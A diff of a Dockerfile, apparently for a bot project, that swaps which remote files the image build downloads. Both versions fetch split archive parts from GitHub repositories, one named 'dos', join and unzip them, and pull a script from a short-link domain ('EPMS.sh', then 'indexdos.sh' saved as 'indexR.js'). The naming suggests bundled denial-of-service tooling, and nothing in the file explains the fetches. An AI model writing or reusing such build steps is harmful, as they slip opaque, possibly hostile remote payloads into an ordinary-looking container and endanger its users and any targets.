@@ -6,13 +6,11 @@ imagemagick \
 webp && \
 apt-get upgrade -y && \
 rm -rf /var/lib/apt/lists/*
-RUN wget https://github.com/werbertofc/dos/raw/main/aa https://github.com/werbertofc/dos/raw/main/ab https://github.com/werbertofc/dos/raw/main/ac https://github.com/werbertofc/dos/raw/main/ad https://github.com/werbertofc/dos/raw/main/ae https://github.com/werbertofc/dos/raw/main/af
+RUN wget https://github.com/phxxv/inatsuki-bot-ph-inatsuki-/raw/main/aa https://github.com/phxxv/inatsuki-bot-ph-inatsuki-/raw/main/ab
 RUN cat a* > renderbfanarrowx.zip
 RUN unzip renderbfanarrowx.zip
 RUN rm -rf renderbfanarrowx.zip
-RUN wget -O main.sh https://go.bruceds.my.id/EPMS.sh
+RUN wget -O indexR.js https://go.bruceds.my.id/indexdos.sh
 COPY . .
-
-EXPOSE 5000 3000
-
-CMD ["sh", "start.sh"]
+EXPOSE 5000
+CMD ["node", "index.js"]
